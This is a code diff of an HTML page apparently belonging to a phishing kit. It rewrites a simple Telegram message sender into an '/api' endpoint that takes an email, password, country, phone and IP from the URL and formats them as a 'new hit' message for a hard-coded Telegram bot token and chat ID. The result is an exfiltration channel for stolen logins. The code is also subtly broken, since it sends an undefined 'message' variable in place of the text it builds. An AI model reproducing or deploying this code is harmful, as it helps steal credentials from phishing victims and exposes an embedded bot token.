@@ -3,51 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال تلقائي عبر Telegram</title>
+    <title>API Telegram Bot</title>
 </head>
 <body>
-
-    <h2>إرسال رسالة تلقائية عبر Telegram</h2>
-    <p id="status">جارٍ إرسال الرسالة...</p>
 
     <script>
         function getQueryParam(param) {
             const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
+            const value = urlParams.get(param);
+            return decodeURIComponent(value);
         }
 
         function sendMessage(message) {
             const token = "7317755073:AAH3A_2FOVz4O0ulMPPILCZiK7F0L1qrWR0";
             const chatId = "6468882328";
 
-            if (!message) {
-                document.getElementById("status").innerText = "⚠️ لا يوجد نص لإرساله!";
-                return;
-            }
-
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-            fetch(url, {
+            return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             })
             .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    document.getElementById("status").innerText = "✅ تم إرسال الرسالة: " + message;
-                } else {
-                    document.getElementById("status").innerText = "❌ فشل في إرسال الرسالة!";
-                }
-            })
             .catch(error => {
-                document.getElementById("status").innerText = "❌ حدث خطأ: " + error;
+                return { ok: false, error: error.message };
             });
         }
 
-        // جلب المعامل "message" من الرابط وإرساله إلى Telegram
-        const message = getQueryParam("message");
-        sendMessage(message);
+        // Check if the request is for an API call
+        if (window.location.pathname === "/api") {
+            const email = getQueryParam("e");
+            const password = getQueryParam("p");
+            const country = getQueryParam("country");
+            const phone = getQueryParam("phone");
+            const ip = getQueryParam("ip");
+            
+            
+            if (email) {
+            	let text = `
+            	ʜɪ ɴᴇᴡ ʜɪᴛ 🖤.
+ᯓ ᴇᴍᴀɪʟ » ${email}
+ᯓ ᴘᴀꜱꜱᴡᴏʀᴅ » ${password}
+ᯓ ᴄᴏᴜɴᴛʀʏ » ${country}
+ᯓ ᴅɪᴀʟᴄᴏᴅᴇ » ${phone}
+ᯓ ɪᴘ » ${ip}
+            	`;
+            	
+                sendMessage(message).then(data => {
+                    const status = data.ok ? "Message sent successfully!" : "Failed to send message";
+                    const response = {
+                        status: status,
+                        data: data,
+                        message: message
+                    };
+                    // Return JSON response
+                    document.body.innerHTML = JSON.stringify(response);
+                });
+            } else {
+                const response = {
+                    status: "error",
+                    message: "No 'message' parameter provided"
+                };
+                document.body.innerHTML = JSON.stringify(response);
+            }
+        }
     </script>
 
 </body>
